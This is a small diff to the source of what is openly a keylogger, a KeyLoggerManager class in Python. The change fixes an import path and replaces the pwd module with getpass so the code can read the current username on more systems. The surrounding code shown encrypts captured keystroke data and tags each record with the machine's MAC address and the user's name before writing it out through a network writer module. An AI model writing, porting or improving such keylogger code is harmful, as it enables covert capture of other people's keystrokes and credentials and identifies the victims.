@@ -2,10 +2,11 @@ from writer import NetworkWriter
 import time
 from getmac import get_mac_address as gma
 from encryption import ShaulEncryption as Encryption
-from key_logger_service import KeyLoggerService
+from key_logger_service.key_Logger_service import KeyLoggerService
 import threading
 import os
-import pwd
+# import pwd
+import getpass
 
 
 
@@ -43,7 +44,9 @@ class KeyLoggerManager:
             "time": str(date_time),
             "data": encrypted_kd,
             "mac_address": str(self.id),
-            "nickname": str(pwd.getpwuid(os.geteuid()).pw_name)
+            # "nickname": str(pwd.getpwuid(os.geteuid()).pw_name)
+            "nickname": str(getpass.getuser())
+
         }
 
         self.__write(data_to_write=data_for_file)          
